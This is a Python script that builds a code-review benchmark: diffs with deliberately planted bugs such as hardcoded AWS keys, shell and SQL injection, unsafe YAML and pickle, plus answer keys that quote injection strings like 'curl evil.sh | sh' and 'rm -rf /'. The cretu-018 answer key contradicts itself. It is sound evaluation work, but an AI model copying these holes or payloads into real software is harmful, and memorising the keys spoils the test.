"""Build the cretu_testing eval dataset.

Differences vs ood_testing/100-syntetic.txt:
- Subtler bugs (no keyword giveaway in the description that matches the diff).
- Larger diffs with realistic distractor code surrounding the bug.
- Multi-file diffs in the "hard" tier — bug only visible when reading both files.
- More "looks suspicious, is correct" clean cases to stress false-positive rate.
- A few examples with two bugs to test prioritization.

Output: cretu_testing/cretu.txt (JSONL, same schema as 100-syntetic.txt).
"""

from __future__ import annotations

import json
from pathlib import Path


EXAMPLES: list[dict] = []


def add(pr_id, language, difficulty, context, diff, bugs):
    EXAMPLES.append(
        {
            "pr_id": pr_id,
            "language": language,
            "difficulty": difficulty,
            "context": context,
            "diff": diff,
            "bugs": bugs,
        }
    )


# ============================================================================
# EASY — obvious bugs, but embedded in slightly more realistic context
# ============================================================================

add(
    "cretu-001",
    "python",
    "easy",
    "Add S3 client helper for nightly export job",
    """diff --git a/jobs/export/s3_client.py b/jobs/export/s3_client.py
new file mode 100644
index 0000000..1a2b3c4
--- /dev/null
+++ b/jobs/export/s3_client.py
@@ -0,0 +1,28 @@
+import boto3
+import logging
+from datetime import datetime
+
+log = logging.getLogger(__name__)
+
+AWS_ACCESS_KEY = "AKIA4NXJQK2HVUJ7M3PQ"
+AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+BUCKET = "acme-nightly-exports"
+
+
+def get_client():
+    return boto3.client(
+        "s3",
+        aws_access_key_id=AWS_ACCESS_KEY,
+        aws_secret_access_key=AWS_SECRET_KEY,
+        region_name="us-east-1",
+    )
+
+
+def upload_dump(local_path: str) -> str:
+    client = get_client()
+    ts = datetime.utcnow().strftime("%Y%m%d-%H%M%S")
+    key = f"dumps/{ts}/{local_path.rsplit('/', 1)[-1]}"
+    log.info("uploading %s to s3://%s/%s", local_path, BUCKET, key)
+    client.upload_file(local_path, BUCKET, key)
+    return f"s3://{BUCKET}/{key}"
""",
    [
        {
            "file": "jobs/export/s3_client.py",
            "line_start": 7,
            "line_end": 8,
            "category": "hardcoded-secret",
            "severity": "critical",
            "description": (
                "AWS access key and secret are committed as module-level constants. "
                "These must be sourced from environment variables or a secret manager — "
                "anyone with repository access (including CI logs and history) now has "
                "production S3 credentials. Rotate the key immediately and replace with "
                "os.environ lookups or boto3's default credential chain."
            ),
        }
    ],
)

add(
    "cretu-002",
    "typescript",
    "easy",
    "Add /me profile endpoint",
    """diff --git a/src/routes/me.ts b/src/routes/me.ts
index aa11..bb22 100644
--- a/src/routes/me.ts
+++ b/src/routes/me.ts
@@ -1,10 +1,28 @@
 import { Router } from "express";
 import { requireAuth } from "../middleware/auth";
 import { db } from "../db";

 export const meRouter = Router();

-meRouter.get("/me", requireAuth, async (req, res) => {
-  res.json({ ok: true });
-});
+meRouter.get("/me", requireAuth, async (req, res) => {
+  const user = await db.user.findUnique({
+    where: { id: req.user.id },
+  });
+  if (!user) {
+    return res.status(404).json({ error: "not_found" });
+  }
+  res.json({
+    id: user.id,
+    email: user.email,
+    displayName: user.displayName,
+    avatarUrl: user.avatarUrl,
+    createdAt: user.createdAt,
+    passwordHash: user.passwordHash,
+    twoFactorSecret: user.twoFactorSecret,
+  });
+});
""",
    [
        {
            "file": "src/routes/me.ts",
            "line_start": 22,
            "line_end": 23,
            "category": "data-exposure",
            "severity": "critical",
            "description": (
                "The response body includes passwordHash and twoFactorSecret. Even hashed "
                "passwords should never leave the server (they enable offline cracking), "
                "and the TOTP secret breaks 2FA entirely if exposed. Use an explicit "
                "select clause in the query, or define a public DTO that omits these fields."
            ),
        }
    ],
)

add(
    "cretu-003",
    "python",
    "easy",
    "Wire up image conversion via ffmpeg",
    """diff --git a/services/media/convert.py b/services/media/convert.py
index 33aa..44bb 100644
--- a/services/media/convert.py
+++ b/services/media/convert.py
@@ -1,8 +1,20 @@
 import subprocess
 from pathlib import Path

+
+def convert_to_mp4(src: Path, dst: Path, codec: str = "libx264") -> None:
+    cmd = f"ffmpeg -y -i {src} -c:v {codec} -preset fast {dst}"
+    subprocess.run(cmd, shell=True, check=True)
+
+
 def thumbnail(src: Path, dst: Path, width: int) -> None:
     subprocess.run(
         ["ffmpeg", "-y", "-i", str(src), "-vf", f"scale={width}:-1", str(dst)],
         check=True,
     )
""",
    [
        {
            "file": "services/media/convert.py",
            "line_start": 5,
            "line_end": 7,
            "category": "command-injection",
            "severity": "critical",
            "description": (
                "convert_to_mp4 builds a shell command via f-string interpolation and runs "
                "it with shell=True. If src or dst comes from user input (filenames, URLs, "
                "user-supplied codec), a value like '$(rm -rf /)' or 'a.mp4; curl evil.sh | "
                "sh' executes arbitrary commands. The thumbnail helper directly below "
                "already shows the safe pattern: pass arguments as a list and drop shell=True."
            ),
        }
    ],
)

add(
    "cretu-004",
    "go",
    "easy",
    "Persist user preferences to DB",
    """diff --git a/internal/prefs/store.go b/internal/prefs/store.go
index 12ab..34cd 100644
--- a/internal/prefs/store.go
+++ b/internal/prefs/store.go
@@ -10,6 +10,18 @@ type Store struct {
     db *sql.DB
 }

+func (s *Store) Save(ctx context.Context, userID int64, prefs Prefs) error {
+    payload, err := json.Marshal(prefs)
+    if err != nil {
+        return err
+    }
+    s.db.ExecContext(ctx,
+        `INSERT INTO user_prefs (user_id, payload, updated_at)
+         VALUES ($1, $2, now())
+         ON CONFLICT (user_id) DO UPDATE SET payload = $2, updated_at = now()`,
+        userID, payload)
+    return nil
+}
+
 func (s *Store) Get(ctx context.Context, userID int64) (Prefs, error) {
     var raw []byte
     err := s.db.QueryRowContext(ctx,
""",
    [
        {
            "file": "internal/prefs/store.go",
            "line_start": 17,
            "line_end": 21,
            "category": "unchecked-error",
            "severity": "high",
            "description": (
                "The ExecContext result is discarded and the function unconditionally "
                "returns nil. If the database is unreachable or the SQL fails, the caller "
                "believes the save succeeded and the UI will show stale preferences as if "
                "persisted. Capture the (result, err) from ExecContext and return err."
            ),
        }
    ],
)

add(
    "cretu-005",
    "python",
    "easy",
    "Add config loader for k8s job descriptors",
    """diff --git a/tools/k8s/loader.py b/tools/k8s/loader.py
index 55ee..66ff 100644
--- a/tools/k8s/loader.py
+++ b/tools/k8s/loader.py
@@ -1,12 +1,18 @@
 import yaml
 from pathlib import Path


 def load_job_spec(path: Path) -> dict:
-    return yaml.safe_load(path.read_text())
+    return yaml.load(path.read_text(), Loader=yaml.Loader)


 def load_all(dir: Path) -> list[dict]:
-    return [load_job_spec(p) for p in sorted(dir.glob("*.yaml"))]
+    specs = []
+    for p in sorted(dir.glob("*.yaml")):
+        specs.append(load_job_spec(p))
+    return specs
""",
    [
        {
            "file": "tools/k8s/loader.py",
            "line_start": 6,
            "line_end": 6,
            "category": "unsafe-deserialization",
            "severity": "high",
            "description": (
                "load_job_spec switched from yaml.safe_load to yaml.load with the full "
                "Loader. yaml.Loader allows arbitrary Python object construction "
                "(!!python/object/apply:os.system), which is remote code execution if any "
                "of these YAML files originate from a less-trusted source (PR-submitted "
                "configs, user uploads, third-party templates). Revert to safe_load."
            ),
        }
    ],
)

add(
    "cretu-006",
    "java",
    "easy",
    "Add shared date formatter for API responses",
    """diff --git a/src/main/java/com/acme/api/DateUtil.java b/src/main/java/com/acme/api/DateUtil.java
index 77aa..88bb 100644
--- a/src/main/java/com/acme/api/DateUtil.java
+++ b/src/main/java/com/acme/api/DateUtil.java
@@ -1,10 +1,18 @@
 package com.acme.api;

 import java.text.SimpleDateFormat;
 import java.util.Date;
+import java.util.TimeZone;

 public class DateUtil {
+    private static final SimpleDateFormat ISO =
+        new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'");
+
+    static {
+        ISO.setTimeZone(TimeZone.getTimeZone("UTC"));
+    }
+
     public static String formatIso(Date d) {
-        SimpleDateFormat f = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'");
-        f.setTimeZone(TimeZone.getTimeZone("UTC"));
-        return f.format(d);
+        return ISO.format(d);
     }
 }
""",
    [
        {
            "file": "src/main/java/com/acme/api/DateUtil.java",
            "line_start": 8,
            "line_end": 9,
            "category": "thread-safety",
            "severity": "high",
            "description": (
                "SimpleDateFormat is not thread-safe — concurrent calls to format() can "
                "produce garbled output or throw NumberFormatException because the parser "
                "mutates an internal Calendar field. The previous code constructed a fresh "
                "formatter per call, which was correct. Replace with DateTimeFormatter "
                "(java.time, immutable + thread-safe) or keep formatter construction inside "
                "the method."
            ),
        }
    ],
)

add(
    "cretu-007",
    "javascript",
    "easy",
    "Log auth flow for debugging",
    """diff --git a/src/auth/login.js b/src/auth/login.js
index 99cc..aadd 100644
--- a/src/auth/login.js
+++ b/src/auth/login.js
@@ -3,12 +3,16 @@ import { signJwt } from "./jwt";

 export async function login(req, res) {
   const { email, password } = req.body;
   const user = await findUser(email);
   if (!user || !(await verifyPassword(password, user.passwordHash))) {
+    console.log("login failed", { email, password });
     return res.status(401).json({ error: "invalid_credentials" });
   }
   const token = signJwt({ sub: user.id });
+  console.log("login ok", { email, token });
   return res.json({ token });
 }
""",
    [
        {
            "file": "src/auth/login.js",
            "line_start": 8,
            "line_end": 14,
            "category": "sensitive-logging",
            "severity": "high",
            "description": (
                "The failure path logs the plaintext password the user just attempted, "
                "and the success path logs the freshly minted JWT. Both end up in stdout, "
                "shipped to the central log aggregator, and retained per the log retention "
                "policy. Anyone with log access can replay tokens or harvest credentials. "
                "Remove these console.log lines or redact the sensitive fields."
            ),
        }
    ],
)

add(
    "cretu-008",
    "python",
    "easy",
    "Add password reset token generator",
    """diff --git a/auth/reset.py b/auth/reset.py
index 11aa..22bb 100644
--- a/auth/reset.py
+++ b/auth/reset.py
@@ -1,8 +1,18 @@
-import secrets
+import random
+import string
 from datetime import datetime, timedelta

+
+def _token(n: int = 32) -> str:
+    alphabet = string.ascii_letters + string.digits
+    return "".join(random.choice(alphabet) for _ in range(n))
+
+
 def create_reset_token(user_id: int) -> tuple[str, datetime]:
-    return secrets.token_urlsafe(32), datetime.utcnow() + timedelta(hours=1)
+    return _token(32), datetime.utcnow() + timedelta(hours=1)
""",
    [
        {
            "file": "auth/reset.py",
            "line_start": 1,
            "line_end": 9,
            "category": "weak-randomness",
            "severity": "critical",
            "description": (
                "The reset-token generator was switched from secrets.token_urlsafe to "
                "random.choice. random is a Mersenne-Twister PRNG seeded from system time "
                "and is fully predictable given a handful of observed outputs — an attacker "
                "who triggers a few resets can forge tokens for arbitrary users. Restore "
                "secrets.token_urlsafe (or secrets.choice) for any security-sensitive "
                "randomness."
            ),
        }
    ],
)


# ============================================================================
# MEDIUM — subtler bugs, often requires reading the function and understanding
# its invariant rather than spotting a stock pattern.
# ============================================================================

add(
    "cretu-009",
    "python",
    "medium",
    "Paginate audit log endpoint",
    """diff --git a/api/audit.py b/api/audit.py
index 33cc..44dd 100644
--- a/api/audit.py
+++ b/api/audit.py
@@ -10,12 +10,21 @@ PAGE_SIZE = 50

 @router.get("/audit")
 def list_audit(page: int = 1):
-    offset = (page - 1) * PAGE_SIZE
-    rows = db.execute(
-        "SELECT id, actor, action, ts FROM audit_log ORDER BY id DESC LIMIT %s OFFSET %s",
-        (PAGE_SIZE, offset),
-    ).fetchall()
-    return {"page": page, "rows": [dict(r) for r in rows]}
+    offset = page * PAGE_SIZE
+    rows = db.execute(
+        "SELECT id, actor, action, ts FROM audit_log ORDER BY id DESC LIMIT %s OFFSET %s",
+        (PAGE_SIZE, offset),
+    ).fetchall()
+    total = db.execute("SELECT count(*) FROM audit_log").fetchone()[0]
+    return {
+        "page": page,
+        "total": total,
+        "has_more": offset + len(rows) < total,
+        "rows": [dict(r) for r in rows],
+    }
""",
    [
        {
            "file": "api/audit.py",
            "line_start": 13,
            "line_end": 13,
            "category": "off-by-one",
            "severity": "high",
            "description": (
                "The offset computation lost the '(page - 1)' adjustment. With the new "
                "formula page=1 returns rows 50-99, skipping the first 50 entries entirely, "
                "and there is no way for the client to ever see the most recent page. The "
                "fix is offset = (page - 1) * PAGE_SIZE, matching the pre-diff behavior."
            ),
        }
    ],
)

add(
    "cretu-010",
    "python",
    "medium",
    "Reconcile invoice totals against ledger",
    """diff --git a/billing/reconcile.py b/billing/reconcile.py
index 55ee..66ff 100644
--- a/billing/reconcile.py
+++ b/billing/reconcile.py
@@ -1,9 +1,22 @@
+from decimal import Decimal
 from .models import Invoice, LedgerEntry

+
+def reconcile(invoice: Invoice, entries: list[LedgerEntry]) -> bool:
+    total = 0.0
+    for e in entries:
+        if e.invoice_id == invoice.id:
+            total += float(e.amount_cents) / 100.0
+    return total == float(invoice.amount_cents) / 100.0
+
+
 def list_unreconciled(invoices: list[Invoice], entries: list[LedgerEntry]) -> list[Invoice]:
-    return [inv for inv in invoices if not reconcile(inv, entries)]
+    return [inv for inv in invoices if not reconcile(inv, entries)]
""",
    [
        {
            "file": "billing/reconcile.py",
            "line_start": 6,
            "line_end": 11,
            "category": "float-equality",
            "severity": "high",
            "description": (
                "Money is being summed and compared as float. Repeated addition of cent "
                "values (e.g. 0.10 + 0.20) produces 0.30000000000000004, so a perfectly "
                "matched ledger will report as unreconciled and the unreconciled list will "
                "include invoices that are actually paid. The amount_cents fields are "
                "already integers — keep them as integers and compare those directly, or "
                "use Decimal throughout. The imported Decimal at the top is the giveaway "
                "that the safer type was on the author's mind but went unused."
            ),
        }
    ],
)

add(
    "cretu-011",
    "typescript",
    "medium",
    "Fetch user feed inside dashboard",
    """diff --git a/src/components/Feed.tsx b/src/components/Feed.tsx
index 77aa..88bb 100644
--- a/src/components/Feed.tsx
+++ b/src/components/Feed.tsx
@@ -1,18 +1,27 @@
 import { useEffect, useState } from "react";
 import { fetchFeed, FeedItem } from "../api/feed";

 export function Feed({ userId }: { userId: string }) {
   const [items, setItems] = useState<FeedItem[]>([]);
+  const [loading, setLoading] = useState(true);

-  useEffect(() => {
-    fetchFeed(userId).then(setItems);
-  }, [userId]);
+  useEffect(() => {
+    async function load() {
+      setLoading(true);
+      const data = await fetchFeed(userId);
+      setItems(data);
+      setLoading(false);
+    }
+    load();
+  }, [userId]);

+  if (loading) return <Spinner />;
   return (
     <ul>
       {items.map((it) => (
-        <li key={it.id}>{it.title}</li>
+        <li key={it.id}>{it.title}</li>
       ))}
     </ul>
   );
 }
""",
    [
        {
            "file": "src/components/Feed.tsx",
            "line_start": 9,
            "line_end": 16,
            "category": "race-on-prop-change",
            "severity": "high",
            "description": (
                "When userId changes mid-flight, the in-flight fetch for the previous user "
                "can resolve after the new one and overwrite items with stale data. There "
                "is no cancellation token or 'ignore' flag, so the visible feed can "
                "silently revert to a previous user's feed. Track a 'cancelled' flag in a "
                "cleanup function returned from the effect, or use AbortController and "
                "check signal.aborted before calling setItems."
            ),
        }
    ],
)

add(
    "cretu-012",
    "python",
    "medium",
    "Track recently-seen item ids per user",
    """diff --git a/services/feed/dedup.py b/services/feed/dedup.py
index 33aa..44bb 100644
--- a/services/feed/dedup.py
+++ b/services/feed/dedup.py
@@ -1,9 +1,18 @@
+from collections import deque
+
+
+def record_seen(user_id: int, item_id: int, seen: deque = deque(maxlen=100)) -> None:
+    seen.append((user_id, item_id))
+
+
+def recent_for(user_id: int, seen: deque) -> list[int]:
+    return [iid for (uid, iid) in seen if uid == user_id]
""",
    [
        {
            "file": "services/feed/dedup.py",
            "line_start": 4,
            "line_end": 5,
            "category": "mutable-default-arg",
            "severity": "high",
            "description": (
                "The deque default argument is evaluated once at function-definition time "
                "and shared across every call. Every user_id's recent items end up in the "
                "same deque, so cross-user leakage is guaranteed: user A will see B's "
                "items in 'recent'. The default should be None, with a fresh deque "
                "constructed inside the function (or, better, an explicit store keyed by "
                "user_id passed by the caller)."
            ),
        }
    ],
)

add(
    "cretu-013",
    "javascript",
    "medium",
    "Stagger reveal animations on grid mount",
    """diff --git a/src/anim/grid.js b/src/anim/grid.js
index 99aa..88bb 100644
--- a/src/anim/grid.js
+++ b/src/anim/grid.js
@@ -1,9 +1,19 @@
 export function revealCards(cards) {
-  for (let i = 0; i < cards.length; i++) {
-    setTimeout(() => {
-      cards[i].classList.add("visible");
-    }, i * 80);
-  }
+  for (var i = 0; i < cards.length; i++) {
+    setTimeout(function () {
+      cards[i].classList.add("visible");
+    }, i * 80);
+  }
 }
""",
    [
        {
            "file": "src/anim/grid.js",
            "line_start": 2,
            "line_end": 6,
            "category": "closure-over-loop-var",
            "severity": "high",
            "description": (
                "Changing 'let i' to 'var i' reintroduces the classic var-in-setTimeout "
                "bug: all the deferred callbacks share the same i, which by the time they "
                "fire equals cards.length. Each call then evaluates cards[cards.length], "
                "which is undefined, and throws \"Cannot read properties of undefined "
                "(reading 'classList')\". The original 'let i' was correct — revert, or "
                "capture i in a per-iteration constant inside the loop body."
            ),
        }
    ],
)

add(
    "cretu-014",
    "python",
    "medium",
    "Verify webhook signatures from Stripe",
    """diff --git a/webhooks/stripe.py b/webhooks/stripe.py
index 22aa..33bb 100644
--- a/webhooks/stripe.py
+++ b/webhooks/stripe.py
@@ -1,12 +1,22 @@
 import hmac
 import hashlib
 import os

 SECRET = os.environ["STRIPE_WEBHOOK_SECRET"].encode()


 def verify(payload: bytes, header: str) -> bool:
-    # header format: "t=1700000000,v1=<hex>"
-    parts = dict(p.split("=", 1) for p in header.split(","))
-    expected = hmac.new(SECRET, f"{parts['t']}.{payload.decode()}".encode(), hashlib.sha256).hexdigest()
-    return hmac.compare_digest(parts["v1"], expected)
+    parts = dict(p.split("=", 1) for p in header.split(","))
+    expected = hmac.new(
+        SECRET, f"{parts['t']}.{payload.decode()}".encode(), hashlib.sha256
+    ).hexdigest()
+    return parts["v1"] == expected
""",
    [
        {
            "file": "webhooks/stripe.py",
            "line_start": 13,
            "line_end": 13,
            "category": "timing-attack",
            "severity": "high",
            "description": (
                "The comparison was downgraded from hmac.compare_digest to ==. Python's "
                "string equality short-circuits on the first mismatched character, so an "
                "attacker who can time many requests can recover the expected signature "
                "byte by byte. Restore hmac.compare_digest for constant-time comparison."
            ),
        }
    ],
)

add(
    "cretu-015",
    "python",
    "medium",
    "Persist event timestamps",
    """diff --git a/services/events/record.py b/services/events/record.py
index 11ee..22ff 100644
--- a/services/events/record.py
+++ b/services/events/record.py
@@ -1,10 +1,16 @@
-from datetime import datetime, timezone
+from datetime import datetime
 from .db import session
 from .models import Event


 def record(event_type: str, payload: dict) -> int:
-    e = Event(type=event_type, payload=payload, ts=datetime.now(timezone.utc))
-    session.add(e)
-    session.commit()
-    return e.id
+    e = Event(type=event_type, payload=payload, ts=datetime.utcnow())
+    session.add(e)
+    session.commit()
+    return e.id
""",
    [
        {
            "file": "services/events/record.py",
            "line_start": 7,
            "line_end": 7,
            "category": "naive-datetime",
            "severity": "medium",
            "description": (
                "datetime.utcnow() returns a tz-naive value (and is deprecated as of "
                "Python 3.12). Persisting naive UTC into a column that's typically "
                "TIMESTAMPTZ either causes the DB driver to localize it against the "
                "session timezone or stores a value without tz metadata — either way "
                "downstream comparisons against tz-aware values raise TypeError. Keep the "
                "original datetime.now(timezone.utc), which is tz-aware UTC."
            ),
        }
    ],
)

add(
    "cretu-016",
    "typescript",
    "medium",
    "Forward custom click handler on Button",
    """diff --git a/src/ui/Button.tsx b/src/ui/Button.tsx
index 44aa..55bb 100644
--- a/src/ui/Button.tsx
+++ b/src/ui/Button.tsx
@@ -1,18 +1,22 @@
 import { ButtonHTMLAttributes } from "react";
 import { track } from "../analytics";

 type Props = ButtonHTMLAttributes<HTMLButtonElement> & {
   trackId?: string;
 };

-export function Button({ trackId, onClick, ...rest }: Props) {
-  return (
-    <button
-      {...rest}
-      onClick={(e) => {
-        if (trackId) track(trackId);
-        onClick?.(e);
-      }}
-    />
-  );
-}
+export function Button({ trackId, onClick, ...rest }: Props) {
+  return (
+    <button
+      onClick={(e) => {
+        if (trackId) track(trackId);
+        onClick?.(e);
+      }}
+      {...rest}
+    />
+  );
+}
""",
    [
        {
            "file": "src/ui/Button.tsx",
            "line_start": 11,
            "line_end": 18,
            "category": "props-spread-order",
            "severity": "high",
            "description": (
                "The order of spread vs onClick was flipped — ...rest now comes after the "
                "instrumented onClick, so any onClick the caller passed via rest will "
                "overwrite the wrapped handler and the track() call is silently skipped. "
                "Either keep onClick after the spread (the previous behavior), or destructure "
                "onClick out of rest before spreading (which the code already does — the fix "
                "is just to put onClick={...} after {...rest})."
            ),
        }
    ],
)

add(
    "cretu-017",
    "python",
    "medium",
    "Cache user permissions in Redis",
    """diff --git a/services/auth/cache.py b/services/auth/cache.py
index 88aa..99bb 100644
--- a/services/auth/cache.py
+++ b/services/auth/cache.py
@@ -1,12 +1,22 @@
 import json
 from .redis_client import r

-CACHE_TTL_SECONDS = 300
+# Cache for 5 minutes
+CACHE_TTL_MS = 5 * 60 * 1000


 def get_perms(user_id: int) -> list[str] | None:
     raw = r.get(f"perms:{user_id}")
     return json.loads(raw) if raw else None


 def set_perms(user_id: int, perms: list[str]) -> None:
-    r.setex(f"perms:{user_id}", CACHE_TTL_SECONDS, json.dumps(perms))
+    r.setex(f"perms:{user_id}", CACHE_TTL_MS, json.dumps(perms))
""",
    [
        {
            "file": "services/auth/cache.py",
            "line_start": 4,
            "line_end": 13,
            "category": "unit-mismatch",
            "severity": "high",
            "description": (
                "redis.setex expects the TTL in seconds, not milliseconds. The constant was "
                "renamed to MS and computed as 5*60*1000 = 300000, so cached permissions "
                "now persist for ~83 hours instead of 5 minutes. Stale permissions (after a "
                "role revoke) will linger far longer than the security model assumes. Either "
                "keep the value in seconds or use r.psetex for the ms variant."
            ),
        }
    ],
)

add(
    "cretu-018",
    "python",
    "medium",
    "Merge admin defaults into user-supplied config",
    """diff --git a/services/config/merge.py b/services/config/merge.py
index 22cc..33dd 100644
--- a/services/config/merge.py
+++ b/services/config/merge.py
@@ -1,10 +1,18 @@
+ADMIN_DEFAULTS = {
+    "max_seats": 5,
+    "feature_billing": False,
+    "is_admin": False,
+}
+
+
+def build_effective_config(user_supplied: dict) -> dict:
+    # Users can override their settings but admin/safety defaults win.
+    return user_supplied | ADMIN_DEFAULTS
""",
    [
        {
            "file": "services/config/merge.py",
            "line_start": 9,
            "line_end": 10,
            "category": "dict-merge-order",
            "severity": "critical",
            "description": (
                "The intent stated in the comment is 'admin defaults win', but the dict "
                "union 'user_supplied | ADMIN_DEFAULTS' has ADMIN_DEFAULTS on the right, "
                "so its keys overwrite user_supplied — which is the opposite of a "
                "vulnerability only because ADMIN_DEFAULTS is the safe side. Wait, look "
                "again: user_supplied | ADMIN_DEFAULTS gives precedence to the right "
                "operand. So ADMIN_DEFAULTS wins, which matches the comment — but it also "
                "means a user CANNOT override max_seats even when they should be able to. "
                "If the real intent is 'user can override but is_admin must always be "
                "False', split safety-critical defaults from overridable ones and apply "
                "ADMIN_DEFAULTS last only for the safety-critical subset. As written the "
                "intent is ambiguous and either reading produces a bug."
            ),
        }
    ],
)

add(
    "cretu-019",
    "python",
    "medium",
    "Send daily digest emails with retry",
    """diff --git a/jobs/digest/send.py b/jobs/digest/send.py
index 11bb..22cc 100644
--- a/jobs/digest/send.py
+++ b/jobs/digest/send.py
@@ -1,17 +1,28 @@
 import logging
 from .ses import send_email
 from .db import users_for_digest, mark_sent

 log = logging.getLogger(__name__)


 def send_digest_batch() -> dict:
     sent = 0
     failed = 0
     for user in users_for_digest():
         try:
             send_email(user.email, render_digest(user))
+            mark_sent(user.id)
             sent += 1
-        except Exception:
+        except Exception as exc:
+            log.warning("digest failed for %s: %s", user.id, exc)
             failed += 1
-            log.exception("digest failed for %s", user.id)
     return {"sent": sent, "failed": failed}
""",
    [
        {
            "file": "jobs/digest/send.py",
            "line_start": 14,
            "line_end": 15,
            "category": "wrong-side-effect-order",
            "severity": "high",
            "description": (
                "mark_sent(user.id) was moved before the increment but, more importantly, "
                "it now runs immediately after send_email succeeds and inside the same try "
                "block. If mark_sent itself raises (DB hiccup, conflicting transaction), "
                "the catch path treats this as a delivery failure and counts it as failed — "
                "but the email already went out. On the next batch the user receives the "
                "digest again. Either move mark_sent outside the try, or catch mark_sent's "
                "exceptions separately and treat them as 'delivered but bookkeeping "
                "failed', not as a delivery failure."
            ),
        }
    ],
)

add(
    "cretu-020",
    "python",
    "medium",
    "Increment usage counter on each API call",
    """diff --git a/middleware/usage.py b/middleware/usage.py
index 44cc..55dd 100644
--- a/middleware/usage.py
+++ b/middleware/usage.py
@@ -1,12 +1,20 @@
 from .cache import cache  # in-memory dict guarded by no lock

+
+def bump(key: str, by: int = 1) -> int:
+    if key in cache:
+        cache[key] = cache[key] + by
+    else:
+        cache[key] = by
+    return cache[key]
+
+
+def reset(key: str) -> None:
+    if key in cache:
+        del cache[key]
""",
    [
        {
            "file": "middleware/usage.py",
            "line_start": 4,
            "line_end": 9,
            "category": "race-condition",
            "severity": "high",
            "description": (
                "bump() is read-modify-write on a shared dict with no lock and no atomic "
                "operation. Under concurrent requests two threads can each read the same "
                "value and write back value+1, so increments are silently dropped — usage "
                "counts will undercount, which directly impacts billing fairness. Use "
                "threading.Lock around the read/write, switch to collections.Counter with "
                "an atomic update, or move to a backing store that exposes atomic INCR "
                "(Redis, Postgres)."
            ),
        }
    ],
)

add(
    "cretu-021",
    "python",
    "medium",
    "Order search results by user-supplied column",
    """diff --git a/api/search.py b/api/search.py
index 66aa..77bb 100644
--- a/api/search.py
+++ b/api/search.py
@@ -1,11 +1,18 @@
 from .db import db


+def search(name: str, sort: str = "name") -> list[dict]:
+    rows = db.execute(
+        "SELECT id, name, created_at FROM widgets WHERE name LIKE %s ORDER BY "
+        + sort
+        + " ASC LIMIT 100",
+        (f"%{name}%",),
+    ).fetchall()
+    return [dict(r) for r in rows]
""",
    [
        {
            "file": "api/search.py",
            "line_start": 4,
            "line_end": 9,
            "category": "sql-injection-orderby",
            "severity": "high",
            "description": (
                "The 'sort' parameter is concatenated directly into the SQL. Parameter "
                "binding (%s) doesn't apply to identifiers, only to literal values, so "
                "this is a real injection vector even though the LIKE clause is "
                "parameterized correctly. A request with sort='name; DROP TABLE widgets--' "
                "is unbounded. Validate sort against an allow-list of column names "
                "(e.g. {'name', 'created_at'}) before splicing it in."
            ),
        }
    ],
)

add(
    "cretu-022",
    "typescript",
    "medium",
    "Coerce optional numeric setting with default",
    """diff --git a/src/settings/parse.ts b/src/settings/parse.ts
index 55ee..66ff 100644
--- a/src/settings/parse.ts
+++ b/src/settings/parse.ts
@@ -1,14 +1,20 @@
 type RawSettings = {
   maxRetries?: number;
   timeoutMs?: number;
   useCache?: boolean;
 };

-export function normalize(raw: RawSettings) {
-  return {
-    maxRetries: raw.maxRetries ?? 3,
-    timeoutMs: raw.timeoutMs ?? 5000,
-    useCache: raw.useCache ?? true,
-  };
-}
+export function normalize(raw: RawSettings) {
+  return {
+    maxRetries: raw.maxRetries || 3,
+    timeoutMs: raw.timeoutMs || 5000,
+    useCache: raw.useCache || true,
+  };
+}
""",
    [
        {
            "file": "src/settings/parse.ts",
            "line_start": 9,
            "line_end": 13,
            "category": "nullish-vs-falsy",
            "severity": "high",
            "description": (
                "The fallbacks were converted from ?? to ||. That breaks the legitimate "
                "values 0 and false: maxRetries=0 (caller wants no retries) silently "
                "becomes 3, timeoutMs=0 becomes 5000, and useCache=false becomes true. ?? "
                "only falls back on null/undefined, which is what these defaults intend. "
                "Revert all three to ??."
            ),
        }
    ],
)

add(
    "cretu-023",
    "python",
    "medium",
    "Add tracing decorator using contextvars",
    """diff --git a/lib/tracing/decorator.py b/lib/tracing/decorator.py
index 22dd..33ee 100644
--- a/lib/tracing/decorator.py
+++ b/lib/tracing/decorator.py
@@ -1,14 +1,22 @@
+import time
 import asyncio
 from functools import wraps
 from .span import start_span, end_span


 def traced(name: str):
     def outer(fn):
         @wraps(fn)
         async def inner(*args, **kwargs):
             span = start_span(name)
+            time.sleep(0.001)  # tiny delay so spans don't collide
             try:
                 return await fn(*args, **kwargs)
             finally:
                 end_span(span)
         return inner
     return outer
""",
    [
        {
            "file": "lib/tracing/decorator.py",
            "line_start": 11,
            "line_end": 11,
            "category": "blocking-in-async",
            "severity": "high",
            "description": (
                "time.sleep is synchronous and blocks the entire event loop. Calling it "
                "inside an async wrapper that's intended to instrument every traced call "
                "freezes all concurrent coroutines on the same loop for the duration of "
                "every span — a tracing decorator should be near-free. Use "
                "asyncio.sleep(0.001) (the asyncio import is already at the top), or "
                "remove the delay entirely if span collisions are actually a concern at "
                "the tracing layer."
            ),
        }
    ],
)

add(
    "cretu-024",
    "go",
    "medium",
    "Close files in batch processor",
    """diff --git a/internal/batch/process.go b/internal/batch/process.go
index 77aa..88bb 100644
--- a/internal/batch/process.go
+++ b/internal/batch/process.go
@@ -1,18 +1,26 @@
 package batch

 import (
     "encoding/json"
     "os"
 )

+func ProcessAll(paths []string) ([]Record, error) {
+    var out []Record
+    for _, p := range paths {
+        f, err := os.Open(p)
+        if err != nil {
+            return nil, err
+        }
+        defer f.Close()
+        var rec Record
+        if err := json.NewDecoder(f).Decode(&rec); err != nil {
+            return nil, err
+        }
+        out = append(out, rec)
+    }
+    return out, nil
+}
""",
    [
        {
            "file": "internal/batch/process.go",
            "line_start": 12,
            "line_end": 12,
            "category": "defer-in-loop",
            "severity": "high",
            "description": (
                "defer f.Close() inside the loop body schedules every close to run at "
                "function return, so all file handles stay open for the entire batch. On "
                "a long paths slice this exhausts the per-process file-descriptor limit "
                "and ProcessAll starts failing with 'too many open files'. Either wrap "
                "the per-file work in a helper that returns after closing, or call "
                "f.Close() explicitly at the end of each iteration."
            ),
        }
    ],
)

add(
    "cretu-025",
    "python",
    "medium",
    "Deserialize signed session cookie",
    """diff --git a/auth/session.py b/auth/session.py
index 88dd..99ee 100644
--- a/auth/session.py
+++ b/auth/session.py
@@ -1,17 +1,24 @@
-import json
-import base64
+import pickle
+import base64
 import hmac
 import os

